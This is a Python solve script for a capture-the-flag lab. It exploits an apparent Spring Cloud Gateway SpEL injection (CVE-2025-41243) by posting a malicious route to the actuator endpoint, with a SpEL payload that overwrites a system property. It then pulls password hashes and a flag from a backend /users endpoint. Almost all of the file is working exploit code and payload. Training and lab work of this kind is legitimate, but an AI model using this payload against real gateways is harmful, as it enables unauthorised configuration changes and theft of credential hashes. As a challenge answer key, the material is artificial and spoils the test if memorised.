#!/usr/bin/env python3
"""Flag 1 — CVE-2025-41243 (Spring Cloud Gateway SpEL injection).

Two-step exploit:

  1. Post a route to the gateway actuator whose AddResponseHeader filter
     contains a SpEL expression. SpEL gets evaluated during route construction
     (this is the CVE), so the side-effect runs immediately even though the
     route is never invoked. The expression flips MATO's audit-trace flag
     (mato.gateway.audit.debug-trace) from "false" to "true" by writing into
     @systemProperties via indexer syntax — which bypasses Spring Cloud
     Gateway's restrictive PropertyAccessor (no separate unlock step needed).

  2. With the flag flipped, the gateway's DebugTraceHeaderFilter starts
     forwarding `X-Debug-Trace: true` to the archive-service on every request.
     The archive-service trusts this header and switches the /users response
     into "debug-trace" mode — exposing password hashes (the Flag 2 pivot)
     and embedding Flag 1.

Run standalone:

    python3 solve/solve_flag1.py

Or import:

    from solve_flag1 import run; flag, users = run("http://localhost:8080")
"""

from __future__ import annotations

import json
import sys

import requests

from common import (
    DEFAULT_GATEWAY,
    banner,
    detail,
    die,
    dump,
    find_flag,
    read_mcp_entry_point,
    section,
)


AUDIT_FLIP_PAYLOAD = {
    "uri": "http://example.com",
    "filters": [
        {
            "name": "AddResponseHeader",
            "args": {
                "name": "X-Audit-Flipped",
                "value": "#{@systemProperties['mato.gateway.audit.debug-trace']='true'}",
            },
        }
    ],
}


def _post_route(gateway: str, route_id: str, payload: dict) -> None:
    url = f"{gateway}/actuator/gateway/routes/{route_id}"
    detail("flag1", "POST URL", url)
    detail("flag1", "route id", route_id)
    detail("flag1", "payload", json.dumps(payload))
    dump("flag1", "full payload", payload)
    r = requests.post(
        url,
        headers={"Content-Type": "application/json"},
        data=json.dumps(payload),
        timeout=10,
    )
    detail("flag1", "response status", r.status_code)
    detail("flag1", "response body", r.text or "<empty>")
    dump("flag1", "full response body", r.text or "<empty>")
    if r.status_code not in (200, 201):
        die(f"failed to post route '{route_id}': {r.status_code} {r.text}")
    banner("flag1", "  ✓ route accepted — SpEL evaluated server-side")


def _refresh(gateway: str) -> None:
    url = f"{gateway}/actuator/gateway/refresh"
    detail("flag1", "POST URL", url)
    r = requests.post(url, timeout=10)
    detail("flag1", "response status", r.status_code)
    dump("flag1", "full refresh response", r.text or "<empty>")
    if r.status_code not in (200, 204):
        die(f"refresh failed: {r.status_code}")
    banner("flag1", "  ✓ gateway routes refreshed")


def run(gateway: str) -> tuple[str, list[dict]]:
    banner("flag1", f"target gateway = {gateway}")
    section("flag1", "STEP 1 — flip audit-trace flag via SpEL injection")
    detail("flag1", "CVE", "CVE-2025-41243 (Spring Cloud Gateway)")
    detail("flag1", "technique", "AddResponseHeader filter value = SpEL expression")
    detail(
        "flag1",
        "spel expression",
        AUDIT_FLIP_PAYLOAD["filters"][0]["args"]["value"],
    )
    detail("flag1", "why", "SpEL is evaluated at route-construction time → side effect runs immediately")
    detail("flag1", "target sysprop", "mato.gateway.audit.debug-trace = 'true'")

    banner("flag1", "→ posting malicious route to /actuator/gateway/routes/{id}")
    _post_route(gateway, "auditflip", AUDIT_FLIP_PAYLOAD)

    banner("flag1", "→ refreshing routes to ensure SpEL evaluation")
    _refresh(gateway)

    section("flag1", "STEP 2 — GET /users through gateway with debug-trace ON")
    url = f"{gateway}/users"
    detail("flag1", "GET URL", url)
    detail("flag1", "expectation", "DebugTraceHeaderFilter now forwards X-Debug-Trace: true")
    detail("flag1", "expectation", "archive-service responds with mode='debug-trace' (leaks hashes)")

    r = requests.get(url, timeout=10)
    detail("flag1", "response status", r.status_code)
    if r.status_code != 200:
        die(f"GET /users failed: {r.status_code} {r.text}")

    body = r.json()
    detail("flag1", "response mode", body.get("mode"))
    detail("flag1", "response keys", list(body.keys()))
    dump("flag1", "full /users response", body)

    if body.get("mode") != "debug-trace":
        die(f"gateway forwarded mode={body.get('mode')!r} — exploit did not stick")
    banner("flag1", "  ✓ archive-service in debug-trace mode → exploit succeeded")

    section("flag1", "STEP 3 — extract flag and password hashes")
    flag = body.get("flag") or find_flag(r.text)
    if not flag:
        die("debug-trace /users response did not include a flag")

    users = body.get("users", [])
    detail("flag1", "users returned", len(users))
    for u in users:
        detail(
            "flag1",
            f"  user[{u.get('username','?')}]",
            f"hash={u.get('passwordHash','<none>')[:30]}...",
        )

    banner("flag1", f"FLAG 1 = {flag}")
    banner("flag1", f"recovered {len(users)} users with hashes (Flag 2 pivot)")
    return flag, users


def main() -> None:
    gateway = sys.argv[1] if len(sys.argv) > 1 else (
        read_mcp_entry_point() if (sys.argv and "--mcp" in sys.argv) else DEFAULT_GATEWAY
    )
    flag, users = run(gateway)
    print()
    print(json.dumps({"flag1": flag, "users": users}, indent=2))


if __name__ == "__main__":
    main()
